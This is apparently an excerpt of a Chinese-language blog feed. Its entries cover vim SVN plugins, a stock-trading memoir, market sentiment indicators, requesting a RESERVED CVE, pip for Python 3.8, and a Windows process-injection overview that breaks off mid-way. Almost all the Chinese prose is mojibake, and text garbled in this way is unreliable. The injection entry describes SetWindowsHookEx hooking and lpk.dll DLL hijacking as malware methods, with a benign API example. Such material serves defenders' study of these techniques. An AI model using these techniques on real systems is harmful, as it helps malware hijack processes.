    <content type="html"><![CDATA[<p>å…¬å¸ä½¿ç”¨svnç®¡ç†æºä»£ç ï¼Œé¿å…ä¸äº†è¦å’Œsvnæ‰“äº¤é“ï¼Œæœ‰å‡ ä¸ªæ¯”è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆã€‚</p><h2 id="1-vcscommand-vim"><a href="#1-vcscommand-vim" class="headerlink" title="1. vcscommand.vim"></a>1. vcscommand.vim</h2><p><a href="http://www.vim.org/scripts/script.php?script_id=90">http://www.vim.org/scripts/script.php?script_id=90</a></p><p>è¿™ä¸ªæ’ä»¶çš„ç‰¹ç‚¹æ˜¯æ”¯æŒçš„ç‰ˆæœ¬ç®¡ç†å·¥å…·å¤š,æ”¯æŒgitï¼Œsvnç­‰å¸¸è§ç‰ˆæœ¬ç®¡ç†å·¥å…·ã€‚<br>vcscommand.vimæ’ä»¶é»˜è®¤ç»‘å®šäº†æ— å·®åˆ«çš„å¿«æ·é”®ï¼Œä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ã€‚</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs coq">|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">ca</span> VCSAdd<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cn</span> VCSAnnotate<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cN</span> VCSAnnotate!<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cc</span> VCSCommit<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cD</span> VCSDelete<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cd</span> VCSDiff<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cg</span> VCSGotoOriginal<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cG</span> VCSGotoOriginal!<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">ci</span> VCSInfo<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cl</span> VCSLog<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cL</span> VCSLock<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cr</span> VCSReview<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cs</span> VCSStatus<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cu</span> VCSUpdate<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cU</span> VCSUnlock<br>|<span class="hljs-type">&lt;Leader</span>&gt;|<span class="hljs-type">cv</span> VCSVimDiff<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª <code>&lt;Leader&gt;</code> å¾—çœ‹ä½ å®šä¹‰äº†ä»€ä¹ˆå¿«æ·é”®ï¼Œvim é»˜è®¤çš„æ˜¯ <code>\</code></p><h2 id="2-vim-unite-svn"><a href="#2-vim-unite-svn" class="headerlink" title="2.  vim-unite-svn"></a>2.  vim-unite-svn</h2><p>å°æ—¥æœ¬å†™çš„unite.vimçš„svnæ’ä»¶ï¼Œunite.vim æ˜¯ä¸€ä¸ªéå¸¸ä¸é”™çš„vimæ’ä»¶ï¼Œ<br>å®ƒçš„ä½œç”¨æ˜¯ ä¸ºvim å†™ç®€å•ç•Œé¢ï¼Œè¦ä½¿ç”¨vim-unite-svné¦–å…ˆéœ€è¦å®‰è£…unite.vim æ’ä»¶ï¼Œ<br>æŠ˜è…¾è¿™ä¸ªæ’ä»¶çš„åŸå› æ˜¯vcscommand.vimæœ‰äº›ä¸å¤ªå¥½çš„åœ°æ–¹ã€‚</p><ul><li>bufferç®¡ç†çš„ä¸å¤ªå¥½</li><li>status æ¯”è¾ƒå¼±</li><li>ç¾¡æ…•emacsçš„vc modeçš„ä½“éªŒ</li></ul><p><a href="https://github.com/Shougo/unite.vim">https://github.com/Shougo/unite.vim</a></p><p>å°æ—¥æœ¬å†™çš„ <code>vim-unite-svn</code> æ’ä»¶å¤ªä¹…æ²¡æœ‰æ›´æ–°äº†ï¼Œæœ‰ä¸€äº›bugï¼Œæˆ‘ä¿®æ”¹äº†ä¸€ä¸‹ï¼Œç”¨äº†<br>ä¸€æ®µæ—¶é—´æš‚æ—¶æ²¡æœ‰å‘ç°ä»€ä¹ˆé—®é¢˜ã€‚</p><p><a href="https://github.com/henices/vim-unite-svn">https://github.com/henices/vim-unite-svn</a></p><p>æ”¯æŒåŸºæœ¬çš„svnå‘½ä»¤ï¼Œ svn status, svn info, svn diff, svn commit, svn up</p><p>ä½¿ç”¨ç¤ºä¾‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">:Unite svn/status<br>:Unite svn/diff<br>:Unite svn/blame<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸ªäººç‚’è‚¡ç»å†</title>
    <link href="/cn/stock_experience/"/>
    <url>/cn/stock_experience/</url>
    
    <content type="html"><![CDATA[<p>æœ¬äººITç”·ä¸€æšï¼Œ2015å¹´å…¥å¸‚ï¼Œåˆ°ä»Šå¤©5å¹´å¤šäº†ï¼Œæ‰€å¹¸è¿˜åœ¨åƒäººä¸éœ²éª¨å¤´çš„å¸‚åœºä¸Šæ´»ç€ï¼Œä¹Ÿæ˜¯éå¸¸ä¸å®¹æ˜“ã€‚åŸºæœ¬ä¸å­˜åœ¨ä»€ä¹ˆç‰¹æ®Šæƒ…å†µï¼ŒéŸ­èœæ€»æ˜¯åœ¨äººå£°é¼æ²¸çš„ç‰›å¸‚é«˜ç‚¹å…¥åœºï¼Œæœ¬äººä¹Ÿä¸ä¾‹å¤–ï¼Œä¸Šè¯3500å¤šç‚¹å…¥å¸‚ï¼Œä¸Šè¯3800å¤šç‚¹è®©åª³å¦‡ä¹°äº†æ²ªæ·± 300 åŸºé‡‘ ï¼ˆä¸æ˜¯ETFï¼‰ï¼Œè¿™åŸºé‡‘ä»Šå¹´æ‰è§£å¥—ï¼Œå°èµšå‡ºå±€äº†ã€‚</p><p>è¿æ°”å¥½çš„æ˜¯ï¼Œ2015å¹´çš„æ—¶å€™ä¸­äº†ä¸€æ”¯æ–°è‚¡ï¼Œæ–°è‚¡çš„æ”¶ç›Šå¯¹å†²äº†å€’é‡‘å­—å¡”åŠ ä»“çš„å›æ’¤ï¼Œå°èµš1ä¸‡å…ƒå‡ºå±€æ¸…äº†ä»“ï¼Œæœ‰æ—¶å€™æˆ‘ä¹Ÿåœ¨æƒ³å¦‚æœä¸æ˜¯è¿™èµšäº†1ä¸‡ï¼Œæ˜¯ä¸æ˜¯ä¹Ÿå°±ä¸ä¼šç»§ç»­ç‚’è‚¡äº†ã€‚æ¥ä¸‹æ¥çš„äº‹æƒ…å¤§å®¶éƒ½å¾ˆç†Ÿæ‚‰äº†ï¼Œç†”æ–­å’Œè‚¡ç¾3.0ï¼Œä¸€ç›´åœ¨ä¸èµšå’Œå°äºä¸­æŒ£æ‰ç€ï¼Œå±…ç„¶ä¹ŸåšæŒäº†ä¸‹æ¥ã€‚ç†å·¥ç”·çš„ç‰¹è´¨æ•‘äº†æˆ‘ï¼Œä»2015å¹´å¼€å§‹è®¤çœŸå­¦ä¹ è‚¡ç¥¨æ“ä½œï¼Œæ¶è¡¥åŸºç¡€çŸ¥è¯†ï¼Œåˆ†æ—¶ï¼ŒKçº¿ï¼Œç¼ºå£ï¼Œä»·é‡å…³ç³»ï¼Œç¼ è®ºï¼Œæ³¢æµªç†è®ºï¼Œç®±ä½“ç†è®ºï¼Œè¶‹åŠ¿äº¤æ˜“ï¼Œä»·å€¼æŠ•èµ„ï¼ŒåŸºæœ¬å„ç§ç†è®ºéƒ½çœ‹äº†éï¼Œå…¶å®åˆ°æœ€åå‘ç°æœ‰ç”¨çš„ä¸œè¥¿å¤ªå°‘äº†ï¼Œå…³äºè‚¡ç¥¨çš„ä¹¦ä¹ŸåŸºæœ¬æ²¡å•¥ç”¨ï¼ŒçœŸæ­£æœ‰ç”¨çš„ä¹¦å¯èƒ½å°±é‚£ä¹ˆå‡ æœ¬ï¼Œå¯æ˜¯å¦‚æœä¸çœ‹å‡ åæœ¬çš„è¯ï¼Œä½ æ€ä¹ˆçŸ¥é“å“ªå‡ æœ¬æœ‰ç”¨å‘¢ï¼Ÿæ‰€ä»¥ç‚’è‚¡å¹¶ä¸å­˜åœ¨ä»€ä¹ˆæ·å¾„ï¼Œä¸€å¤œæš´å¯ŒåŸºæœ¬æ˜¯ç¥è¯ï¼Œä¸ºå•¥å‘¢ï¼Ÿç›ˆäºåŒæºï¼Œæ€ä¹ˆèµšé’±å°±å¯èƒ½æ€ä¹ˆäºå›å»ï¼Œé™¤éä½ çŸ¥é“ä½ ä¸ºä»€ä¹ˆèƒ½èµšé’±ã€‚</p><p>ä¸‹é¢æ˜¯è¿™äº›å¹´çš„å¿ƒå¾—ï¼Œåº”è¯¥å¯ä»¥æ¶¨å‡ å¹´åŠŸåŠ›å§ï¼Ÿ</p><p>è¦åœ¨å¸‚åœºä¸Šç”Ÿå­˜ä½ å¿…é¡»å…·å¤‡æŸç§ä¼˜åŠ¿ï¼Œæ²¡æœ‰è¿™ç§ä¼˜åŠ¿å°±æ˜¯çº¯èµŒåšï¼ŒçœŸæ­£èµšé’±çš„æ˜¯è¦åšå¤§æ¦‚ç‡çš„æŠ•æœºã€‚ä¹°å–è‚¡ç¥¨å®é™…ä¸Šæ˜¯å¯¹è‚¡ç¥¨åšåˆ†ç±»ï¼Œå“ªäº›å¯ä»¥åšï¼Œå“ªäº›ä¸å¯ä»¥åšï¼Œè¿™å°±æ¶‰åŠäº†è‚¡ç¥¨äº¤æ˜“ç³»ç»Ÿï¼Œæœ‰äº†äº¤æ˜“ç³»ç»Ÿï¼Œå‰©ä¸‹çš„å°±æ˜¯æ‰§è¡Œé—®é¢˜äº†ï¼Œè¦åšåˆ°BDWQï¼Œåé¢å°±æ˜¯ä»“ä½è®¡ç®—ï¼Œæ ¹æ®è‚¡ç¥¨çš„æ³¢åŠ¨å’Œä½ æ„¿æ„æ‰¿æ‹…çš„é£é™©ç¨‹åº¦è®¡ç®—å‡ºæ¥ã€‚</p><p>å›é¦–çœ‹è™½ç„¶ç°åœ¨ç¨³å®šç›ˆåˆ©äº†ï¼Œåˆå›åˆ°äº†çµé­‚æ‹·é—®ï¼ŒæŠ•å…¥çš„æ—¶é—´å€¼å¾—å—ï¼Ÿå¯¹äºå¾ˆå¤šäººæ¥è¯´ï¼Œæœ€é‡è¦å¯èƒ½æ˜¯èµ„é‡‘çš„åŸå§‹ç§¯ç´¯ï¼Œ10ä¸‡å—ï¼Œç¿»10å€ï¼Œ100ä¸‡åœ¨ä¸­å›½å¾ˆå¤šåŸå¸‚ä¸€å¥—æˆ¿ä¹Ÿä¹°ä¸äº†ï¼Œæ›´ä¸ç”¨è¯´è´¢å¯Œè‡ªç”±äº†ï¼Œæ‰€ä»¥å…ˆåŠªåŠ›å·¥ä½œå§ï¼Œè¾¹å·¥ä½œè¾¹åŠ å¤§æŠ•èµ„æ¯”ä¾‹ï¼Œæ¢¦æƒ³è¿˜æ˜¯è¦æœ‰çš„ï¼Œä¸‡ä¸€å®ç°äº†å‘¢ï¼Ÿ</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å¸‚åœºæƒ…ç»ªæŒ‡æ ‡</title>
    <link href="/cn/stock_emotion/"/>
    <url>/cn/stock_emotion/</url>
    
    <content type="html"><![CDATA[<p>å¯ä»¥é‡åŒ–ä¸€ä¸‹ï¼Œæœ‰æ—¶é—´è€ƒè™‘ç¨‹åºå®ç°ã€‚</p><ul><li>æ¶¨&#x2F;è·Œåœæ¿æ•°</li><li>æ¶¨åœå°ç‰ˆæˆåŠŸç‡</li><li>æ¶¨è·Œè‚¡ç¥¨æ¯”ç‡</li><li>å¤§ç›˜æˆäº¤é‡é¢</li><li>èèµ„ä½™é¢æƒ…å†µ</li><li>åŒ—å‘èµ„é‡‘å‡€æµå…¥ ï¼ˆå‚è€ƒï¼‰</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>How to request a RESERVED CVE</title>
    <link href="/cn/request_RESERVED_CVE/"/>
    <url>/cn/request_RESERVED_CVE/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ç”³è¯· CVE è¿‡ç¨‹ä¸­ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå‘è½¯ä»¶å®˜æ–¹æäº¤æ¼æ´ä¿®å¤åï¼Œç”±äºè½¯ä»¶å®˜æ–¹ä¸æ˜¯CNA æ— æ³•ç›´æ¥åˆ†é…CVEï¼Œè€Œç”³è¯·CVE é€šå¸¸éœ€è¦ä¸€ä¸ªè½¯ä»¶å®˜æ–¹ç¡®è®¤çš„é“¾æ¥ï¼Œè€Œæœ‰äº›æ¯”è¾ƒæ­£è§„çš„è½¯ä»¶åœ¨æ¼æ´ä¿®å¤ä¹‹å‰æ˜¯ä¸ä¼šæœ‰å…¬å¼€é“¾æ¥çš„ï¼Œè¿™å°±æ— æ³•ç”³è¯·CVEäº†ã€‚</p><p>æœ‰ç‚¹é¸¡ç”Ÿè›‹ï¼Œè›‹ç”Ÿé¸¡çš„æ„Ÿè§‰ã€‚è§£å†³è¿™ä¸ªé—®é¢˜çš„åŠæ³•æ˜¯ç”³è¯·ä¸€ä¸ª RESERVED CVEã€‚</p><h2 id="ç”³è¯·-RESERVED-CVE-æ–¹æ³•"><a href="#ç”³è¯·-RESERVED-CVE-æ–¹æ³•" class="headerlink" title="ç”³è¯· RESERVED CVE æ–¹æ³•"></a>ç”³è¯· RESERVED CVE æ–¹æ³•</h2><p>ç”³è¯· RESERVED CVEï¼Œä¹Ÿæ˜¯éœ€è¦å¡«å†™çš„CVE ç”³è¯·è¡¨æ ¼çš„ <a href="https://cveform.mitre.org/%EF%BC%8C%E9%80%89%E6%8B%A9">https://cveform.mitre.org/ï¼Œé€‰æ‹©</a> Request CVE ID</p><p>æ ¹æ®æç¤ºçš„é‡è¦ä¿¡æ¯ï¼š</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">IMPORTANT: Once a CVE ID <span class="hljs-keyword">is</span> assigned <span class="hljs-keyword">to</span> your vulnerability, <span class="hljs-keyword">it</span> will <span class="hljs-keyword">not</span> be published <br><span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> CVE List <span class="hljs-keyword">until</span> you have submitted a URL pointing <span class="hljs-keyword">to</span> public information <span class="hljs-keyword">about</span> <br><span class="hljs-keyword">the</span> vulnerability. Without a public <span class="hljs-keyword">reference</span>, <span class="hljs-keyword">the</span> CVE ID will display <span class="hljs-keyword">as</span> <span class="hljs-string">&quot;RESERVED&quot;</span> <br><span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> CVE List. Please update CVE <span class="hljs-keyword">with</span> <span class="hljs-keyword">a reference</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">the</span> vulnerability&#x27;s <br>details <span class="hljs-keyword">as</span> soon <span class="hljs-keyword">as</span> possible. See this FAQ <span class="hljs-keyword">for</span> more information.<br></code></pre></td></tr></table></figure><p>åªè¦å°† public reference ç•™ç©ºï¼Œå°±å¯ä»¥ç”³è¯· RESERVED CVE äº†ã€‚CVE å®˜æ–¹æ”¶åˆ°è¯·æ±‚åä¼šæœ‰ç¡®è®¤çš„é‚®ä»¶ã€‚</p><h2 id="CVE-å®˜æ–¹åˆ†é…-CVE-ID"><a href="#CVE-å®˜æ–¹åˆ†é…-CVE-ID" class="headerlink" title="CVE å®˜æ–¹åˆ†é… CVE ID"></a>CVE å®˜æ–¹åˆ†é… CVE ID</h2><p>CVE å®˜æ–¹æ”¶åˆ° RESERVED CVE è¯·æ±‚åï¼Œä¼šç»™åˆ†é…ä¸€ä¸ª CVE IDï¼Œä½†æ˜¯çŠ¶æ€ä¸º ** RESERVED ** ï¼Œä¸ä¼šæœ‰å…¬å¼€ç»†èŠ‚ã€‚</p><h2 id="RESERVED-CVE-ç”³è¯·å…¬å¼€"><a href="#RESERVED-CVE-ç”³è¯·å…¬å¼€" class="headerlink" title="RESERVED CVE ç”³è¯·å…¬å¼€"></a>RESERVED CVE ç”³è¯·å…¬å¼€</h2><p>å½“è½¯ä»¶å®˜æ–¹ç¡®è®¤å·²ç»ä¿®å¤æ¼æ´ï¼Œå¹¶ä¸”å‘å¸ƒæ–°ç‰ˆåï¼Œå¯ä»¥é€šçŸ¥ CVE å®˜æ–¹æ›´æ–° CVE çš„çŠ¶æ€ã€‚è¿˜æ˜¯é€šè¿‡å¡«å†™ <a href="https://cveform.mitre.org/">https://cveform.mitre.org/</a> è¡¨æ ¼ï¼Œé€‰æ‹© Notify CVE about a publicationï¼Œå¡«å†™ç›¸å…³ä¿¡æ¯ã€‚</p><h2 id="ä¸€äº›æ³¨æ„äº‹é¡¹"><a href="#ä¸€äº›æ³¨æ„äº‹é¡¹" class="headerlink" title="ä¸€äº›æ³¨æ„äº‹é¡¹"></a>ä¸€äº›æ³¨æ„äº‹é¡¹</h2><ol><li>å°† <a href="mailto:&#99;&#118;&#101;&#x2d;&#x72;&#101;&#113;&#117;&#101;&#x73;&#x74;&#64;&#x6d;&#x69;&#x74;&#114;&#x65;&#x2e;&#x6f;&#114;&#x67;">&#99;&#118;&#101;&#x2d;&#x72;&#101;&#113;&#117;&#101;&#x73;&#x74;&#64;&#x6d;&#x69;&#x74;&#114;&#x65;&#x2e;&#x6f;&#114;&#x67;</a> å’Œ  <a href="mailto:&#x63;&#x76;&#x65;&#64;&#x6d;&#x69;&#116;&#x72;&#x65;&#46;&#x6f;&#114;&#103;">&#x63;&#x76;&#x65;&#64;&#x6d;&#x69;&#116;&#x72;&#x65;&#46;&#x6f;&#114;&#103;</a> åŠ å…¥é‚®ä»¶ç™½åå• ï¼ˆæœ‰å¯èƒ½é‚®ä»¶ä¼šè¢«æˆªæ‹¦ï¼‰</li><li>åœ¨ç”³è¯·å…¬å¼€æ­¥éª¤ä¸­ï¼ŒCVE å®˜æ–¹æœ‰å¯èƒ½å’Œä½ è¦å…¬å¼€æŠ«éœ²çš„é“¾æ¥ï¼Œå¦‚æœè½¯ä»¶å®˜æ–¹ä¸ç»™å†™ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸ª</li></ol><p>æŠ«éœ²è¦æ±‚çš„ä¿¡æ¯ï¼š</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[CVE ID]</span><br><span class="hljs-string">[PRODUCT]</span><br><span class="hljs-string">[VERSION]</span><br><span class="hljs-string">[PROBLEM TYPE]</span><br><span class="hljs-string">[DESCRIPTION]</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python å¤šç‰ˆæœ¬ä½¿ç”¨ pip</title>
    <link href="/cn/python_pip/"/>
    <url>/cn/python_pip/</url>
    
    <content type="html"><![CDATA[<p>Qï¼šFedora 31 æä¾›çš„ Python3.7ï¼Œ æƒ³ä½¿ç”¨ Python3.8ï¼Œ ç”¨ç³»ç»Ÿçš„pip3 åªä¼šç»™ Python3.7 å®‰è£…åº“ï¼Œå¦‚ä½•è§£å†³</p><p>A:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">curl -O https://bootstrap.pypa.io/get-pip.py<br>python3.8 get-pip.py<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸Šé¢å‘½ä»¤åï¼Œä¼šåœ¨ &#x2F;usr&#x2F;local&#x2F;bin&#x2F; ä¸‹ç”Ÿæˆå’Œ pip ç›¸å…³çš„è„šæœ¬ï¼ŒæŠŠè¿™äº›è„šæœ¬åˆ é™¤ï¼Œè¦ä¸å¯èƒ½ä¼šå’Œç³»ç»Ÿçš„ pip3 å†²çªã€‚<br>æ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œå®‰è£… Python3.8 çš„åº“</p><p><code>python3.8 -m pip install pyhash --user</code></p><p>åœ¨å®‰è£…è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå› ä¸ºä¼—æ‰€å‘¨çŸ¥çš„åŸå› å¯¼è‡´ç½‘ç»œå‡ºé”™ï¼Œå¤‡å¥½æ¢¯å­å³å¯ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows è¿›ç¨‹æ³¨å…¥</title>
    <link href="/cn/process_injection/"/>
    <url>/cn/process_injection/</url>
    
    <content type="html"><![CDATA[<h2 id="1-Process-Injection-æ–¹æ³•æ€»ç»“"><a href="#1-Process-Injection-æ–¹æ³•æ€»ç»“" class="headerlink" title="1. Process Injection æ–¹æ³•æ€»ç»“"></a>1. Process Injection æ–¹æ³•æ€»ç»“</h2><p>  è¿›ç¨‹æ³¨å…¥æ˜¯windowsç—…æ¯’å’Œæ¶æ„è½¯ä»¶æœ€å¸¸ç”¨çš„æ‰‹æ³•ä¹‹ä¸€ï¼ŒWindowsä¸‹è¿›ç¨‹æ³¨å…¥çš„æ–¹æ³•æ¯”è¾ƒ<br>å¤šï¼Œè¿™é‡Œä»‹ç»å¸¸è§çš„ä¸€äº›æ–¹æ³•ï¼Œä»¥åŠç›¸åº”çš„æ£€æŸ¥æ‰‹æ®µã€‚</p><h3 id="1-1-SetWindowsHookEx"><a href="#1-1-SetWindowsHookEx" class="headerlink" title="1.1 SetWindowsHookEx"></a>1.1 SetWindowsHookEx</h3><p> SetWindowsHookExä¼°è®¡æ˜¯å¤§å®¶æœ€ç†Ÿæ‚‰çš„æ–¹æ³•äº†ï¼Œè¿™ä¸ªæ˜¯å¾®è½¯æä¾›ç»™æˆ‘ä»¬ä½¿ç”¨æ­£è§„ç”¨æ³•ã€‚<br>å¾€Windowsçš„hook chainä¸­å®‰è£…hook ä¾‹ç¨‹ï¼Œç›‘æ§ç³»ç»ŸæŸç§ç±»å‹çš„event, ä½¿ç”¨è¿™ç§æ–¹æ³•éœ€è¦<br>å®ç°ä¸€ä¸ªdllã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK WINAPI <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(</span><br><span class="hljs-params">  _In_  <span class="hljs-type">int</span> idHook,</span><br><span class="hljs-params">  _In_  HOOKPROC lpfn,</span><br><span class="hljs-params">  _In_  HINSTANCE hMod,</span><br><span class="hljs-params">  _In_  DWORD dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><ul><li>dwThread ä¸º0ï¼Œå°†ç›‘ç®¡ç³»ç»Ÿä¸­æ‰€æœ‰çº¿ç¨‹ã€‚</li><li>idHook        æŒ‡å®šç›‘æ§eventçš„ç±»å‹</li><li>hMod          dllå¥æŸ„</li><li>lpfn          hookä¾‹ç¨‹çš„æŒ‡é’ˆ</li></ul><p>MSDNç»™å‡ºäº†ä¸€ä¸ªä½¿ç”¨çš„ä¾‹å­ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HOOKPROC hkprcSysMsg;<br><span class="hljs-type">static</span> HINSTANCE hinstDLL; <br><span class="hljs-type">static</span> HHOOK hhookSysMsg; <br> <br>hinstDLL = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;c:\\myapp\\sysmsg.dll&quot;</span>)); <br>hkprcSysMsg = (HOOKPROC)<span class="hljs-built_in">GetProcAddress</span>(hinstDLL, <span class="hljs-string">&quot;SysMessageProc&quot;</span>); <br><br>hhookSysMsg = <span class="hljs-built_in">SetWindowsHookEx</span>( <br>                    WH_SYSMSGFILTER,<br>                    hkprcSysMsg,<br>                    hinstDLL,<br>                    <span class="hljs-number">0</span>); <br></code></pre></td></tr></table></figure><p>å€¼å¾—ä¸€æçš„æ˜¯è¿™ä¸ªAPIåªèƒ½ç›‘æ§GUIç¨‹åºï¼Œconsoleçš„ç¨‹åºæ˜¯ç›‘æ§ä¸äº†ã€‚å½“å¹´ä½¿ç”¨çš„æ—¶å€™è¿˜åƒ<br>äº†äºã€‚</p><h3 id="1-2-lpk-dll"><a href="#1-2-lpk-dll" class="headerlink" title="1.2 lpk.dll"></a>1.2 lpk.dll</h3><p> è¿™æ˜¯ä¸€ç§æ¯”è¾ƒå¸¸è§çš„æ–¹æ³•ï¼Œä¸€èˆ¬æŠŠè¿™ç§æ–¹æ³•ç§°ä¸º dll åŠ«æŒ (dll hijack),lpk.dllé»˜è®¤<br>çš„ä½ç½®åœ¨ï¼Œå¦‚æœåœ¨å…¶ä»–çš„è·¯å¾„å‘ç°lpk.dllå°±éœ€è¦éœ€è¦æ³¨æ„äº†ã€‚</p><p>  è¿™ç§æ–¹æ³•éœ€è¦å®ç°å’ŒåŸå§‹çš„lpk.dllä¸€æ ·å¯¼å‡ºå‡½æ•°ï¼Œæ¯ä¸ªå‡½æ•°éƒ½è½¬å‘è°ƒç”¨çœŸæ­£çš„lpk.dll<br>ä¸­çš„å¯¼å‡ºå‡½æ•°ï¼Œè¿™æ ·å¯¹äºç¨‹åºæ¥è¯´æ˜¯å®Œå…¨æ„Ÿè§‰ä¸åˆ°ä»€ä¹ˆå¼‚å¸¸å˜åŒ–çš„ï¼Œä½†æ˜¯å´è¢«ä¼ªé€ çš„lpk.dll<br>è¿‡äº†ä¸€é“ï¼Œæ‰€ä»¥ç§°ä¸ºä¸ºåŠ«æŒã€‚</p><p>  è¿™é‡Œæœ‰äºŒä¸ªé—®é¢˜ï¼Œå€¼å¾—æ€è€ƒã€‚</p><h4 id="å¦‚ä½•èƒ½è®©ç¨‹åºåŠ è½½æˆ‘ä»¬çš„lpk-dllè€Œä¸æ˜¯ç³»ç»ŸçœŸæ­£çš„dll"><a href="#å¦‚ä½•èƒ½è®©ç¨‹åºåŠ è½½æˆ‘ä»¬çš„lpk-dllè€Œä¸æ˜¯ç³»ç»ŸçœŸæ­£çš„dll" class="headerlink" title="å¦‚ä½•èƒ½è®©ç¨‹åºåŠ è½½æˆ‘ä»¬çš„lpk.dllè€Œä¸æ˜¯ç³»ç»ŸçœŸæ­£çš„dll"></a>å¦‚ä½•èƒ½è®©ç¨‹åºåŠ è½½æˆ‘ä»¬çš„lpk.dllè€Œä¸æ˜¯ç³»ç»ŸçœŸæ­£çš„dll</h4><p>  å¦‚æœçŸ¥é“WindowsæŸ¥æ‰¾dllçš„é¡ºåºï¼Œå°±å¾ˆå®¹æ˜“è§£å†³è¿™ä¸ªé—®é¢˜äº†ï¼Œå¾®è½¯çš„MSDNç½‘ç«™å¾ˆè´´å¿ƒåœ°<br>  å›ç­”äº†æˆ‘ä»¬çš„é—®é¢˜ã€‚</p><p> <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">a. The directory <span class="hljs-keyword">from</span> which the application loaded.<br>b. The <span class="hljs-keyword">current</span> directory.<br>c. The <span class="hljs-keyword">system</span> directory. Use the GetSystemDirectory <span class="hljs-keyword">function</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory.<br>d. The <span class="hljs-number">16</span>-<span class="hljs-type">bit</span> <span class="hljs-keyword">system</span> directory. There <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">function</span> that obtains the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory, but it <span class="hljs-keyword">is</span> searched.<br>e. The Windows directory. Use the GetWindowsDirectory <span class="hljs-keyword">function</span> <span 